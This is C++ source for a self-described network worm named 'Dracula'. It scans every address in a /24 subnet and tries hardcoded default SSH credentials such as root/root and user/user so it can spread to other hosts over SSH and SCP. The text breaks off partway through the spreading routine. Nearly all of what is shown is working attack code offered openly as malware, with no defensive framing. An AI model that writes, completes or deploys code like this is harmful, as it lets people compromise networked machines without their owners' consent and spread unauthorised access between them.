//Start Date: 24-09-2024
//author - apocalypse9949(me)
//description - WORM(Dracula) using sftp and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
//WARNING!!
//
#include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
#include <libssh/sftp.h>    //Tthe SFTP library for file transfer.
#include <iostream>         // For input-output operations
#include <fstream>          // For file operations (though not used in this code) but if you want to use this use it with caution!
#include <vector>           // Using vectors to store data
#include <sstream>          // For string stream operations to parse IP addresses

// Worm class 
class Dracula {
private:
    std::string vampire;   // Store network address as a string

public:
    // Constructor to initialize the network address
    Dracula(const std::string& vampire_address) : vampire(vampire_address) {}

    // Function to generate IP addresses on the network (assuming subnet 255.255.255.0)
    std::vector<std::string> blood_suction() {
        std::vector<std::string> white_teeth;   // To store generated IP addresses
        std::istringstream ss(vampire);         // String stream to parse network address
        std::string part;                       // Temporary variable to hold each part of the IP
        std::vector<std::string> tokens;        // To hold the split parts of the IP

        // Split the network IP string into tokens (e.g., 192.168.0.0 -> ["192", "168", "0", "0"])
        while (std::getline(ss, part, '.')) {
            tokens.push_back(part);
        }

        // Generate IP addresses on the network (e.g., 192.168.0.1 to 192.168.0.255)
        for (int i = 1; i < 256; i++) {
            std::ostringstream host;
            host << tokens[0] << "." << tokens[1] << "." << tokens[2] << "." << i;
            white_teeth.push_back(host.str());  // Append the generated address to the list (appending means concatenating addresses)
        }

        return white_teeth;  // Return the list of IP addresses(white teeth😁)
    }

    // Function to return a list of SSH credentials to try
    std::vector<std::pair<std::string, std::string>> get_credentials() {
        return {{"user", "user"}, {"root", "root"}, {"fadmin", "fadmin"}};  // Default credentials
    }

    // Function to spread the worm using SSH
    void spread_via_ssh() {
        ssh_session my_ssh_session;  // SSH session variable
        ssh_scp scp_session;         // SCP session variable for file transfer
        int rc;                      // Return code to check SSH operations

        // For each IP in the generated network addresses
        for (const auto& remote_address : blood_suction()) {
            std::cout << "Trying to spread on the remote host: " << remote_address << std::endl;

            // For each credential set
            for (const auto& cred : get_credentials()) {
                my_ssh_session = ssh_new();  // Create new SSH session
                if (my_ssh_session == NULL) {  // Check if session creation was successful
                    continue;
                }


                   
             
